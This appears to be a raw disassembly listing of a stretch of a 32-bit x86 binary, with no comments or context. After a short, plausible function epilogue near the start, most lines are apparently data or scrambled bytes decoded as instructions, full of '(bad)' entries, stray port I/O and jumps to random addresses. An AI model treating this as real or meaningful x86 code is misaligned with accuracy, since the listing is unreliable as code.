  419e45:	mov    DWORD PTR [ebp-0x4],ecx
  419e48:	mov    ecx,DWORD PTR [ebp+0xc]
  419e4b:	push   eax
  419e4c:	mov    DWORD PTR [ebp+0xc],ecx
  419e4f:	push   DWORD PTR [ebp+0xc]
  419e52:	lea    eax,[ebp-0x4]
  419e55:	push   DWORD PTR [ebp+0x8]
  419e58:	push   eax
  419e59:	push   DWORD PTR [ebp+0xc]
  419e5c:	push   DWORD PTR [ebp-0xc]
  419e5f:	push   DWORD PTR [ebp-0x8]
  419e62:	call   0x419caa
  419e67:	mov    DWORD PTR [ebp-0x4],eax
  419e6a:	mov    eax,DWORD PTR [ebp-0x4]
  419e6d:	leave  
  419e6e:	ret    0x8
  419e71:	dec    esp
  419e72:	inc    ecx
  419e73:	mov    ebp,0xeffebd16
  419e78:	pop    ebx
  419e79:	xchg   ebx,eax
  419e7a:	and    DWORD PTR [ebx-0x47],0x6e4c7e17
  419e81:	gs sbb al,0x1
  419e84:	add    BYTE PTR [ebx-0x21fffffd],ch
  419e8a:	sbb    bh,BYTE PTR cs:[ebx-0x7b4bb458]
  419e91:	das    
  419e92:	addr16 push es
  419e94:	(bad)  
  419e95:	outs   dx,DWORD PTR ds:[esi]
  419e96:	test   BYTE PTR [edi+0x58],dl
  419e99:	test   DWORD PTR [edi-0x2f],esp
  419e9c:	std    
  419e9d:	jmp    0x419edc
  419e9f:	test   eax,0xdf604d43
  419ea4:	cld    
  419ea5:	ret    0x8b06
  419ea8:	pushf  
  419ea9:	and    eax,0xb025c4e
  419eae:	nop
  419eaf:	adc    BYTE PTR [esi-0x31a2329d],cl
  419eb5:	lock jns 0x419efa
  419eb8:	enter  0xd87d,0x56
  419ebc:	xchg   esi,eax
  419ebd:	mov    ah,0x3a
  419ebf:	add    DWORD PTR [bp+di-0x3f],ebx
  419ec3:	std    
  419ec4:	leave  
  419ec5:	jno    0x419efd
  419ec7:	ja     0x419e51
  419ec9:	in     eax,dx
  419eca:	mov    bh,0x93
  419ecc:	xor    DWORD PTR [esi-0x66a7088],ebp
  419ed2:	add    al,0xc6
  419ed4:	sub    DWORD PTR [ebp+esi*1-0x4a],edi
  419ed8:	mul    BYTE PTR [edi-0x594a7705]
  419ede:	fisubr DWORD PTR [esi]
  419ee0:	jge    0x419f59
  419ee2:	aaa    
  419ee3:	test   eax,0xb1738eb1
  419ee8:	push   es
  419ee9:	retf   
  419eea:	xchg   edx,eax
  419eeb:	repnz dec ebx
  419eed:	sar    edx,1
  419eef:	push   ebp
  419ef0:	xchg   esi,eax
  419ef1:	stos   BYTE PTR es:[edi],al
  419ef2:	mov    ch,BYTE PTR [eax]
  419ef4:	call   0x23a1fab
  419ef9:	stos   BYTE PTR es:[edi],al
  419efa:	mov    eax,DWORD PTR [ebx]
  419efc:	and    ebp,DWORD PTR [esi+0x34]
  419eff:	clc    
  419f00:	iret   
  419f01:	add    BYTE PTR [esi],0x90
  419f04:	imul   edx,DWORD PTR [ecx],0xffffffcf
  419f07:	cli    
  419f08:	or     ebp,0x8
  419f0b:	fstp   DWORD PTR [esp+ecx*8+0x65]
  419f0f:	nop    DWORD PTR [ebx-0x30468e49]
  419f16:	pop    ebx
  419f17:	xchg   esi,eax
  419f18:	mov    ds:0x246acb70,eax
  419f1d:	mov    edx,0x9956e8b
  419f22:	popa   
  419f23:	add    BYTE PTR [ecx+0x38],cl
  419f26:	mov    ebx,DWORD PTR [edi-0x6a0fb7f4]
  419f2c:	je     0x419f34
  419f2e:	or     DWORD PTR [edx],esi
  419f30:	popf   
  419f31:	test   BYTE PTR [ecx-0x45],dl
  419f34:	mov    ebp,0xee018f8b
  419f39:	outs   dx,DWORD PTR ds:[esi]
  419f3a:	call   FWORD PTR [edx+0x58]
  419f3d:	xor    cl,ch
  419f3f:	pushf  
  419f40:	mov    dh,0xfc
  419f42:	pushf  
  419f43:	(bad)  
  419f44:	jb     0x419ef9
  419f46:	repnz retf 0xbfac
  419f4a:	daa    
  419f4b:	cs jnp 0x419ece
  419f4e:	iret   
  419f4f:	mov    ds:0x53ee5685,al
  419f54:	sub    dl,BYTE PTR [esi-0x5c]
  419f57:	fsubr  st,st(1)
  419f59:	cmp    eax,0x5f8eca1
  419f5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f5f:	add    BYTE PTR [ebx],cl
  419f61:	js     0x419fdd
  419f63:	pop    eax
  419f64:	sub    BYTE PTR [eax+0x4b],0x31
  419f68:	ja     0x419fd2
  419f6a:	out    dx,eax
  419f6b:	mov    cl,0x8c
  419f6d:	int    0x4
  419f6f:	push   ebx
  419f70:	and    eax,0x37ae60ba
  419f75:	imul   ebp,ebx,0xb8719982
  419f7b:	or     eax,0xbdff56ff
  419f80:	pop    ss
  419f81:	ds inc ebx
  419f83:	xchg   edi,eax
  419f84:	xor    ecx,DWORD PTR [esi*1+0x5f3acc8b]
  419f8b:	sti    
  419f8c:	mov    ebx,0x11913437
  419f91:	dec    ecx
  419f92:	mov    ds:0xc9e8bcbd,al
  419f97:	lods   al,BYTE PTR ds:[esi]
  419f98:	pop    ebp
  419f99:	push   eax
  419f9a:	adc    DWORD PTR [ebp+0x4d],eax
  419f9d:	xchg   edx,eax
  419f9e:	mov    bl,BYTE PTR [ebp-0xe440ec2]
  419fa4:	cld    
  419fa5:	sahf   
  419fa6:	(bad)  
  419fa7:	je     0x419f8e
  419fa9:	hlt    
  419faa:	adc    esp,DWORD PTR [eax]
  419fac:	nop
  419fad:	dec    ecx
  419fae:	iret   
  419faf:	sbb    eax,0xa5434806
  419fb4:	cmc    
  419fb5:	fidivr WORD PTR [esi-0x5b]
  419fb8:	mov    ebx,0xc2848e90
  419fbd:	and    DWORD PTR [esi+ebx*1-0x4f],eax
  419fc1:	clc    
  419fc2:	mov    dh,0xf2
  419fc4:	push   ebx
  419fc5:	(bad)
  419fc9:	popa   
  419fca:	and    BYTE PTR [eax-0x7b127717],ah
  419fd0:	outs   dx,DWORD PTR ds:[esi]
  419fd1:	dec    ebp
  419fd2:	ldmxcsr DWORD PTR [edi]
  419fd5:	mov    al,ds:0xa54d3d85
  419fdb:	push   0x6b
  419fdd:	pop    ebp
  419fde:	sbb    DWORD PTR [eax-0x67],edi
  419fe1:	inc    edx
  419fe2:	mul    DWORD PTR [esi-0x181f77c]
  419fe8:	add    bl,BYTE PTR [edx+0x5ac7e404]
  419fee:	jmp    0x23f80a87
  419ff3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ff4:	out    0x85,eax
  419ff6:	sub    BYTE PTR [ebp-0x58784104],0xc5
  419ffd:	pop    ss
  419ffe:	lock cmc 
  41a000:	loop   0x41a066
  41a002:	addr16 inc esi
  41a004:	inc    edi
  41a005:	jbe    0x419fd1
  41a007:	into   
  41a008:	pause  
  41a00a:	loopne 0x419f91
  41a00c:	aam    0x32
  41a00e:	(bad)  
  41a00f:	lods   al,BYTE PTR ds:[esi]
  41a010:	jno    0x41a07a
  41a012:	mov    ch,0x91
  41a014:	xchg   esi,eax
  41a015:	pop    esp
  41a016:	push   ss
  41a017:	fimul  WORD PTR [eax+0x777dc74c]
  41a01d:	das    
  41a01e:	mov    ecx,0x408864ea
  41a023:	add    bh,BYTE PTR [ecx+0x3c]
  41a026:	pop    ebp
  41a027:	add    ebx,edi
  41a029:	mov    bh,0x91
  41a02b:	je     0x41a012
  41a02d:	adc    eax,0xb01019e
  41a032:	add    dl,BYTE PTR [esi+0x1cc5803a]
  41a038:	add    al,0x6c
  41a03a:	popa   
  41a03b:	js     0x41a067
  41a03d:	mov    BYTE PTR [edi+0x8],bh
  41a040:	lahf   
  41a041:	pop    dx
  41a043:	xchg   edx,eax
  41a044:	enter  0x747a,0xa7
  41a048:	jmp    0x419ffe
  41a04a:	leave  
  41a04b:	lds    edi,FWORD PTR [edx+0x78f641dc]
  41a051:	mov    WORD PTR [edi+0x73b093db],es
  41a057:	idiv   DWORD PTR [ebp-0x25]
  41a05a:	daa    
  41a05b:	dec    ebp
  41a05c:	or     esi,DWORD PTR [di-0x79c9]
  41a061:	mov    ds:0x5f06e24c,eax
  41a066:	call   0x3400:0xcb9a5e7e
  41a06d:	xchg   esi,eax
  41a06e:	pop    esi
  41a06f:	ja     0x41a02b
  41a071:	jns    0x41a073
  41a073:	cmp    eax,0x1efcf364
  41a078:	iret   
  41a079:	cmp    BYTE PTR [edx],bl
  41a07b:	cmp    al,0x67
  41a07d:	scas   al,BYTE PTR es:[edi]
  41a07e:	xor    BYTE PTR [esi-0x2c43d3c3],dh
  41a084:	out    dx,eax
  41a085:	sub    BYTE PTR [ecx+0x2f6dfe80],dl
  41a08b:	and    eax,0xfcee57e5
  41a090:	cdq    
  41a091:	add    al,ah
  41a093:	xchg   ebp,eax
  41a094:	int    0xe8
  41a096:	dec    esp
  41a097:	fisubr WORD PTR ds:0xf3dbefff
  41a09d:	in     eax,0xc
  41a09f:	mov    dl,0x67
  41a0a1:	fs adc ah,ch
  41a0a4:	jmp    FWORD PTR [edx]
  41a0a6:	sbb    eax,0xe2cc4c1b
  41a0ab:	leave  
  41a0ac:	mov    dh,0x25
  41a0ae:	jb     0x41a0c0
  41a0b0:	and    eax,DWORD PTR [edx-0x80]
  41a0b3:	(bad)
  41a0b6:	adc    DWORD PTR [esi+0x306cb7db],edi
  41a0bc:	jg     0x41a0cc
  41a0be:	int3   
  41a0bf:	jl     0x41a079
  41a0c1:	out    0x1e,al
  41a0c3:	fs mov edx,0xa1f00ad8
  41a0c9:	xchg   edx,ecx
  41a0cb:	stc    
  41a0cc:	rol    BYTE PTR [edi+ebx*8+0x2b],1
  41a0d0:	xlat   BYTE PTR ds:[ebx]
  41a0d1:	push   edx
  41a0d2:	or     DWORD PTR [edi-0x61a983c1],edi
  41a0d8:	pop    ecx
  41a0d9:	out    0xc9,eax
  41a0db:	push   eax
  41a0dc:	and    BYTE PTR [ecx],dl
  41a0de:	outs   dx,DWORD PTR ds:[esi]
  41a0df:	ret    0xf19
  41a0e2:	fwait
  41a0e3:	add    esp,DWORD PTR [ebp-0x7464bef7]
  41a0e9:	inc    esi
  41a0ea:	add    eax,0x5ad15f9
  41a0ef:	lods   al,BYTE PTR ds:[esi]
  41a0f0:	fsubrp st(4),st
  41a0f2:	out    0xb7,eax
  41a0f4:	pop    ecx
  41a0f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a0f6:	add    esi,DWORD PTR [edx-0x20]
  41a0f9:	das    
  41a0fa:	ja     0x41a0e9
  41a0fc:	xlat   BYTE PTR ds:[ebx]
  41a0fd:	call   0xc8e3:0xf9d8b2f9
  41a104:	mov    al,ds:0xcc11a7de
  41a109:	sbb    cl,BYTE PTR [edi]
  41a10b:	fisub  WORD PTR ds:0xbd8bfedb
  41a111:	mov    ah,0xf6
  41a113:	stos   DWORD PTR es:[edi],eax
  41a114:	jle    0x41a11f
  41a116:	loope  0x41a120
  41a118:	js     0x41a14d
  41a11a:	and    eax,0xcbd7a6e8
  41a11f:	push   ss
  41a120:	cmp    dh,BYTE PTR [edx]
  41a122:	ins    DWORD PTR es:[edi],dx
  41a123:	lds    esp,FWORD PTR [eax+0x3feae901]
  41a129:	in     eax,0x33
  41a12b:	inc    edi
  41a12c:	(bad)  
  41a12d:	cmp    DWORD PTR [eax-0x56],esp
  41a130:	aaa    
  41a131:	hlt    
  41a132:	jae    0x41a145
  41a134:	lods   eax,DWORD PTR ds:[esi]
  41a135:	ret    0x955
  41a138:	loop   0x41a0eb
  41a13a:	jmp    0xd0df29e
  41a13f:	data16 mov al,0xd4
  41a142:	sbb    al,0x6b
  41a144:	xchg   ecx,eax
  41a145:	dec    eax
  41a146:	jno    0x41a11b
  41a148:	(bad)  
  41a149:	loopne 0x41a0d0
  41a14b:	outs   dx,DWORD PTR ds:[esi]
  41a14c:	ins    DWORD PTR es:[edi],dx
  41a14d:	repz into 
  41a14f:	cmp    ecx,DWORD PTR ds:0x76419f16
  41a155:	push   edi
  41a156:	mov    esi,0x4e9030ad
  41a15b:	jns    0x41a13d
  41a15d:	dec    edi
  41a15e:	lock xor edx,esp
  41a161:	mov    eax,0x4c49ff06
  41a167:	ja     0x41a1bd
  41a169:	mov    DWORD PTR [eax-0x11210b38],ebp
  41a16f:	mov    ecx,0xce59e24a
  41a174:	and    BYTE PTR [esi],bh
  41a176:	fldenv [esi-0x41fa5b70]
  41a17c:	pop    ebx
  41a17d:	es (bad) 
  41a17f:	sbb    eax,0x36537a0f
  41a184:	das    
  41a185:	loop   0x41a107
  41a187:	adc    DWORD PTR [edi],ebx
  41a189:	lock test dh,ah
  41a18c:	jmp    0xaae4522b
  41a191:	add    ecx,DWORD PTR [ecx-0x75]
  41a194:	stc    
  41a195:	sub    al,0x63
  41a197:	in     eax,dx
  41a198:	in     eax,0x3a
  41a19a:	lods   al,BYTE PTR ds:[esi]
  41a19b:	xchg   edx,eax
  41a19c:	rol    DWORD PTR [edi],1
  41a19e:	mov    ah,0x35
  41a1a0:	xor    bl,BYTE PTR [ecx-0x5a]
  41a1a3:	jl     0x41a1e4
  41a1a5:	dec    edi
  41a1a6:	jne    0x41a20e
  41a1a8:	aam    0x5d
  41a1aa:	mov    eax,0x96de03b6
  41a1af:	jle    0x41a15d
  41a1b1:	dec    eax
  41a1b2:	lock push ss
  41a1b4:	cmc    
  41a1b5:	scas   eax,DWORD PTR es:[edi]
  41a1b6:	xlat   BYTE PTR ds:[ebx]
  41a1b7:	std    
  41a1b8:	jle    0x41a189
  41a1ba:	fsincos 
  41a1bc:	push   0xffffffc5
  41a1be:	test   eax,0x11f749ce
  41a1c3:	ficomp WORD PTR [edx-0x13feae10]
  41a1c9:	dec    edx
  41a1ca:	mov    BYTE PTR [esi],0x39
  41a1cd:	jl     0x41a249
  41a1cf:	jno    0x41a24e
  41a1d1:	xchg   edi,eax
  41a1d2:	add    eax,0x4c09c3af
  41a1d7:	mov    dh,0x5b
  41a1d9:	pop    esi
  41a1da:	add    dl,bl
  41a1dc:	cmp    DWORD PTR [esi+0x67af2fc4],esi
  41a1e2:	ja     0x41a1c6
  41a1e4:	mov    al,0x7c
  41a1e6:	fnstcw WORD PTR [eax]
  41a1e8:	cld    
  41a1e9:	ret    0x9e19
  41a1ec:	and    esp,DWORD PTR gs:[ebx+ebp*2-0x50309aa2]
  41a1f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a1f5:	pop    ebp
  41a1f6:	clc    
  41a1f7:	jne    0x41a26a
  41a1f9:	cmp    DWORD PTR [edx-0x3e],edx
  41a1fc:	inc    eax
  41a1fd:	jb     0x41a1a8
  41a1ff:	inc    edi
  41a200:	(bad)  
  41a202:	data16 in al,0xee
  41a205:	mov    ds:0xe6625db3,al
  41a20a:	inc    esi
  41a20b:	hlt    
  41a20c:	pop    ecx
  41a20d:	in     al,dx
  41a20e:	pop    esp
  41a20f:	int    0x6f
  41a211:	cs dec esp
  41a213:	in     eax,0xa1
  41a215:	and    al,0x32
  41a217:	ins    DWORD PTR es:[edi],dx
  41a218:	xor    eax,0xd359589a
  41a21d:	imul   esp,DWORD PTR [edi],0xffffffa3
  41a220:	fcomp  DWORD PTR ds:0xdb8912bd
  41a226:	push   ecx
  41a227:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a228:	fsubp  st(7),st
  41a22a:	cmp    al,0x9e
  41a22d:	mov    BYTE PTR [eax],cl
  41a22f:	mov    di,0x7201
  41a233:	add    BYTE PTR [eax],0x0
	...
  41a23e:	add    BYTE PTR [eax],al
  41a240:	add    BYTE PTR [esi-0x105c14ff],ch
  41a246:	jmp    0x41a236
  41a248:	or     eax,0x116c2f8b
  41a24d:	xchg   esp,eax
  41a24e:	icebp  
  41a24f:	xlat   BYTE PTR ds:[ebx]
  41a250:	xor    al,0x10
  41a252:	and    BYTE PTR [ecx],al
  41a254:	add    BYTE PTR [ebx+0x1a000003],ch
  41a25a:	cs stc 
  41a25c:	mov    cl,0xda
  41a25e:	rcr    edi,0xf4
  41a261:	xchg   DWORD PTR [esi],esi
  41a263:	clc    
  41a264:	sti    
  41a265:	add    BYTE PTR [edx+edx*8],bl
  41a268:	in     al,0x29
  41a26a:	push   cs
  41a26b:	xchg   esi,eax
  41a26c:	adc    DWORD PTR [ecx-0x5e],edi
  41a26f:	pusha  
  41a270:	pop    esp
  41a271:	xor    DWORD PTR [edx+0xc],ebp
  41a274:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a275:	mov    eax,ds:0x67753265
  41a27a:	popa   
  41a27b:	or     al,0x3c
  41a27d:	xor    dh,BYTE PTR [eax+0x7f]
  41a280:	ret    
  41a281:	popa   
  41a282:	fiadd  WORD PTR [ecx+0x55]
  41a285:	jne    0x41a22b
  41a287:	cmp    eax,0x6cf60ec5
  41a28c:	push   cs
  41a28d:	and    BYTE PTR ds:0xb44cb1be,ah
  41a293:	sub    eax,0x2288e27e
  41a298:	and    BYTE PTR [ebp-0x4f279fad],0xde
  41a29f:	das    
  41a2a0:	iret   
  41a2a1:	(bad)  
  41a2a2:	daa    
  41a2a3:	pusha  
  41a2a4:	xlat   BYTE PTR ds:[ebx]
  41a2a5:	and    DWORD PTR [esi],ebx
  41a2a7:	dec    edx
  41a2a8:	fs dec ebp
  41a2aa:	mov    cl,0xf9
  41a2ac:	add    dh,bl
  41a2ae:	lahf   
  41a2af:	sahf   
  41a2b0:	and    al,BYTE PTR [esi-0x77a99bb5]
  41a2b6:	ret    0xb251
  41a2b9:	jns    0x41a2d3
  41a2bb:	stos   DWORD PTR es:[edi],eax
  41a2bc:	sbb    BYTE PTR [edi-0xe],al
  41a2bf:	ret    0xfb6c
  41a2c2:	push   ebx
  41a2c3:	rcl    DWORD PTR [ebx],cl
  41a2c5:	or     BYTE PTR [eax],al
  41a2c7:	arpl   WORD PTR [ebp+0x5450572e],sp
  41a2cd:	mulps  xmm7,XMMWORD PTR [ebx]
  41a2d0:	(bad)  
  41a2d1:	push   0x4d
  41a2d3:	and    eax,ecx
  41a2d5:	xchg   ebx,eax
  41a2d6:	ins    BYTE PTR es:[edi],dx
  41a2d7:	ja     0x41a25a
  41a2d9:	sbb    eax,0xf652a4ea
  41a2de:	retf   
  41a2df:	shl    DWORD PTR [ebx+0x44],1
  41a2e2:	add    BYTE PTR [edx-0x3c],dl
  41a2e5:	(bad)  
  41a2e6:	ret    
  41a2e7:	shl    DWORD PTR [edi],1
  41a2e9:	add    eax,0xffd7085d
  41a2ee:	bound  di,DWORD PTR [eax-0x546b0cbd]
  41a2f5:	ret    0x74d
  41a2f8:	xchg   edx,eax
  41a2f9:	push   ds
  41a2fa:	cdq    
  41a2fb:	sbb    esi,esp
  41a2fd:	jnp    0x41a379
  41a2ff:	retf   
  41a300:	push   eax
  41a301:	push   ecx
  41a302:	jmp    DWORD PTR [edi-0x17037a83]
  41a308:	jmp    0x460c820
  41a30d:	pop    edi
  41a30e:	sub    eax,0xf7ff384c
  41a313:	jnp    0x41a392
  41a315:	dec    ecx
  41a316:	mov    ebx,edx
  41a318:	(bad)  
  41a31a:	xchg   edx,eax
  41a31b:	lods   al,BYTE PTR ds:[esi]
  41a31c:	xor    bl,BYTE PTR ss:[edi]
  41a31f:	xchg   ecx,eax
  41a320:	push   ebx
  41a321:	xor    DWORD PTR [eax-0x45],ebx
  41a324:	and    ebx,DWORD PTR [eax]
  41a326:	ror    bh,1
  41a328:	jb     0x41a316
  41a32a:	cmc    
  41a32b:	loop   0x41a2c7
  41a32d:	rcl    BYTE PTR [edi-0x45],0x43
  41a331:	lods   al,BYTE PTR ds:[esi]
  41a332:	and    DWORD PTR [edx+0x79909260],ebx
  41a338:	sbb    dl,ah
  41a33a:	leave  
  41a33b:	mov    edi,0xfaed3e5
  41a340:	push   esi
  41a341:	xchg   ebx,eax
  41a342:	idiv   BYTE PTR [ecx]
  41a344:	pusha  
  41a345:	fimul  WORD PTR [eax+0x3e9deba8]
  41a34b:	data16 std 
  41a34d:	scas   eax,DWORD PTR es:[edi]
  41a34e:	add    al,0xe2
  41a350:	inc    ebx
  41a351:	aas    
  41a352:	shl    DWORD PTR [edx-0xe53edce],0xd5
  41a359:	pop    ds
  41a35a:	stc    
  41a35b:	push   ss
  41a35c:	add    BYTE PTR [edi-0x75213d8a],0xcd
  41a363:	daa    
  41a364:	(bad)  
  41a365:	mov    eax,0x37d68103
  41a36a:	push   ss
  41a36b:	mov    al,ds:0x377fcefd
  41a370:	push   ebp
  41a371:	mov    BYTE PTR [ebx-0x318305af],ch
  41a377:	mov    dl,0x1c
  41a379:	(bad)  
  41a37a:	nop
  41a37b:	xor    BYTE PTR [ebx-0x3e],dh
  41a37e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a37f:	rcr    BYTE PTR ss:[esi+0x423f5376],cl
  41a386:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a387:	add    BYTE PTR [edi],dl
  41a389:	jo     0x41a321
  41a38b:	aas    
  41a38c:	hlt    
  41a38d:	mov    ebx,DWORD PTR [ebp+esi*1+0x18]
  41a391:	xchg   edi,eax
  41a392:	xchg   ecx,eax
  41a393:	(bad)  
  41a394:	lock (bad) 
  41a396:	into   
  41a397:	fimul  WORD PTR [ecx+ebp*4]
  41a39a:	in     al,0x6f
  41a39c:	mov    dh,0x43
  41a39e:	or     bh,BYTE PTR [ecx-0x76]
  41a3a1:	popa   
  41a3a2:	mov    eax,DWORD PTR [ebx-0x4a]
  41a3a5:	imul   ebp,eax,0x11
  41a3a8:	mul    BYTE PTR [esi-0x3f]
  41a3ab:	push   ss
  41a3ac:	push   eax
  41a3ad:	rcr    DWORD PTR [ebx],0x2b
  41a3b0:	repz dec esp
  41a3b2:	int3   
  41a3b3:	rcl    BYTE PTR [ebx],1
  41a3b5:	mov    esp,0x136bf937
  41a3ba:	rcl    BYTE PTR [ebx-0x2],0x7c
  41a3be:	pop    ebp
  41a3bf:	xchg   BYTE PTR [edx+0x5d],dh
  41a3c2:	fdivr  DWORD PTR [esi]
  41a3c4:	arpl   WORD PTR [edi],sp
  41a3c6:	in     eax,0x2
  41a3c8:	dec    ebx
  41a3c9:	pushf  
  41a3ca:	out    0x18,eax
  41a3cc:	xchg   esi,eax
  41a3cd:	mov    esi,0x93108af0
  41a3d2:	retf   
  41a3d3:	ror    eax,0xec
  41a3d6:	repnz push ebx
  41a3d8:	retf   0x6d3
  41a3db:	sub    dl,ch
  41a3dd:	aad    0x83
  41a3df:	inc    ecx
  41a3e0:	fnop   
  41a3e2:	sbb    DWORD PTR [ebx-0xd],esi
  41a3e5:	jnp    0x41a3f9
  41a3e7:	call   0x1aa6c214
  41a3ec:	mov    al,ds:0x3638a7b7
  41a3f1:	or     edi,edi
  41a3f3:	fs dec eax
  41a3f5:	mov    eax,0x3c54c4d9
  41a3fa:	mov    bl,0xfd
  41a3fc:	dec    eax
  41a3fd:	icebp  
  41a3fe:	push   edi
  41a3ff:	adc    al,0x7d
  41a401:	inc    esp
  41a402:	scas   al,BYTE PTR es:[edi]
  41a403:	in     eax,0x9d
  41a405:	jecxz  0x41a42e
  41a407:	loopne 0x41a3f7
  41a409:	lods   eax,DWORD PTR ds:[esi]
  41a40a:	add    edi,0x22d6f97d
  41a410:	enter  0x74dd,0xb
  41a414:	pop    edx
  41a415:	stos   BYTE PTR es:[edi],al
  41a416:	cdq    
  41a417:	xor    BYTE PTR [eax],ch
  41a419:	fwait
  41a41a:	call   0x3732fa53
  41a41f:	mov    cs,WORD PTR [ecx+0x1802c219]
  41a425:	push   esi
  41a426:	jecxz  0x41a3e8
  41a428:	mov    al,0x4f
  41a42a:	and    eax,0xd6326b8e
  41a42f:	aam    0x5e
  41a431:	rcr    cl,cl
  41a433:	scas   eax,DWORD PTR es:[edi]
  41a434:	xchg   BYTE PTR [eax],dh
  41a436:	in     al,dx
  41a437:	lds    esi,FWORD PTR [edx+0x400ac8f2]
  41a43d:	jae    0x41a417
  41a43f:	mov    eax,0x5d595da6
  41a444:	jmp    0x44114321
  41a449:	(bad)  
  41a44a:	jp     0x41a4a8
  41a44c:	add    BYTE PTR [ebp+esi*4-0x54],0x98
  41a451:	out    dx,al
  41a452:	jnp    0x41a4c2
  41a454:	and    ebp,DWORD PTR [esi-0x8ee81ec]
  41a45a:	ret    0x7612
  41a45d:	push   eax
  41a45e:	mov    ecx,0xaaae617
  41a463:	hlt    
  41a464:	mov    edi,0x2f8095f3
  41a469:	pusha  
  41a46a:	adc    bl,dh
  41a46c:	(bad)  
  41a46d:	dec    esp
  41a46e:	imul   ebp,edx,0x1a
  41a471:	or     al,0xfe
  41a473:	pop    ebp
  41a474:	mov    ecx,0x9c5d6dad
  41a479:	mov    ebp,0xca100ad
  41a47e:	out    0xbe,eax
  41a480:	sbb    al,0xf4
  41a482:	pop    esi
  41a483:	repz into 
  41a485:	xor    BYTE PTR [esi-0x74],ah
  41a488:	push   ss
  41a489:	inc    esi
  41a48a:	sub    eax,0xe3669019
  41a48f:	jno    0x41a456
  41a491:	dec    esi
  41a492:	lock xchg esi,edi
  41a495:	aaa    
  41a496:	inc    ecx
  41a497:	mov    ebp,0xaf22685e
  41a49c:	xor    dl,dh
  41a49e:	mov    ebp,0x626d8323
  41a4a3:	mov    BYTE PTR ds:0x7be90593,ch
  41a4a9:	test   edx,0x75474cd4
  41a4af:	xchg   bh,dh
  41a4b1:	out    0x48,al
  41a4b3:	and    DWORD PTR [ecx+0x47acbeda],ebx
  41a4b9:	xchg   ebx,eax
  41a4ba:	outs   dx,DWORD PTR ds:[esi]
  41a4bb:	sbb    ebx,DWORD PTR [edx]
  41a4bd:	shl    BYTE PTR [ecx+0x6ff472f8],0xbb
  41a4c4:	mov    eax,0x4b5d6c15
  41a4c9:	rol    DWORD PTR [ebp+ecx*1-0x56eab27f],0x1b
  41a4d1:	test   al,0x81
  41a4d3:	ja     0x41a45d
  41a4d5:	jl     0x41a4fe
  41a4d7:	fbstp  TBYTE PTR [edi+0x75cf10b3]
  41a4dd:	push   ds
  41a4de:	push   cs
  41a4df:	push   ebx
  41a4e0:	hlt    
  41a4e1:	mov    dh,0x4e
  41a4e3:	dec    esi
  41a4e4:	inc    edx
  41a4e5:	pusha  
  41a4e6:	shr    BYTE PTR [edi-0x3f11daa1],0x66
  41a4ed:	lds    ebx,FWORD PTR [eax-0x70ca62f1]
  41a4f3:	sbb    al,0xd5
  41a4f5:	dec    ebp
  41a4f6:	out    0x8c,eax
  41a4f8:	test   DWORD PTR [eax+0xe],0x82e04e2e
  41a4ff:	add    BYTE PTR [eax-0x56be2942],ah
  41a505:	dec    esi
  41a506:	ins    DWORD PTR es:[edi],dx
  41a507:	(bad)  
  41a508:	cmp    DWORD PTR [ecx],ebx
  41a50a:	push   edi
  41a50b:	push   ecx
  41a50c:	call   FWORD PTR [edi]
  41a50e:	inc    esp
  41a50f:	bnd jbe 0x41a588
  41a512:	mov    dh,0x52
  41a514:	mov    eax,0x89a90324
  41a519:	mov    ch,0x3b
  41a51b:	mov    esi,0xe228dae
  41a520:	(bad)  
  41a523:	dec    eax
  41a524:	inc    ebx
  41a525:	sub    DWORD PTR [ecx+ebp*2-0x2a67bcbb],0xa17347f4
  41a530:	sbb    BYTE PTR [esi-0x54063087],bh
  41a536:	mov    gs,WORD PTR ds:0x907785eb
  41a53c:	jge    0x41a520
  41a53e:	push   ebx
  41a53f:	bound  eax,QWORD PTR [edi-0x7a]
  41a542:	cwde   
  41a543:	xchg   edx,eax
  41a544:	shl    esp,1
  41a546:	enter  0x821e,0x41
  41a54a:	popf   
  41a54b:	jge    0x41a53f
  41a54d:	loopne 0x41a555
  41a54f:	push   edi
  41a550:	rcl    cl,cl
  41a552:	jb     0x41a560
  41a554:	fdiv   DWORD PTR [ebp-0x10]
  41a557:	mov    ebx,0x7aadfab3
  41a55c:	ficomp DWORD PTR [edx-0x74]
  41a55f:	mov    ch,0x54
  41a561:	sahf   
  41a562:	mov    BYTE PTR [ecx],al
  41a564:	out    dx,eax
  41a565:	rcl    BYTE PTR [ebx+0xb],cl
  41a568:	mov    ds:0x4e9b6ffd,al
  41a56d:	inc    ecx
  41a56e:	jae    0x41a4fe
  41a570:	push   cs
  41a571:	cdq    
  41a572:	imul   edi,DWORD PTR [esi-0x6c9a6c0a],0xdf3f96cf
  41a57c:	adc    eax,0x1891d693
  41a581:	push   DWORD PTR ds:0xd66f21d9
  41a587:	cld    
  41a588:	cmp    ebx,eax
  41a58a:	and    eax,0x90111520
  41a58f:	dec    eax
  41a590:	repnz xchg edi,eax
  41a592:	retf   
  41a593:	pushf  
  41a594:	jmp    0x73dc:0xfe6e2384
  41a59b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a59c:	xchg   esp,eax
  41a59d:	inc    esp
  41a59e:	xchg   ebp,eax
  41a59f:	adc    esp,ebp
  41a5a1:	cmp    BYTE PTR [ebp-0x78],cl
  41a5a4:	int3   
  41a5a5:	loope  0x41a587
  41a5a7:	xor    BYTE PTR [edi],dh
  41a5a9:	push   es
  41a5aa:	scas   eax,DWORD PTR es:[edi]
  41a5ab:	xchg   edx,eax
  41a5ac:	fisubr DWORD PTR [eax]
  41a5ae:	jge    0x41a5bd
  41a5b0:	sbb    al,0xd
  41a5b2:	fidiv  WORD PTR [esi-0x7e46719b]
  41a5b8:	or     eax,0x8f1ced30
  41a5bd:	out    dx,eax
  41a5be:	mov    ebp,0xac730630
  41a5c3:	call   0xc8709ba3
  41a5c8:	jbe    0x41a5b8
  41a5ca:	stc    
  41a5cb:	mov    eax,0x39008e0e
  41a5d0:	cdq    
  41a5d1:	mov    ebx,0x9bf134b6
  41a5d6:	dec    edx
  41a5d7:	pop    edx
  41a5d8:	out    0x8b,al
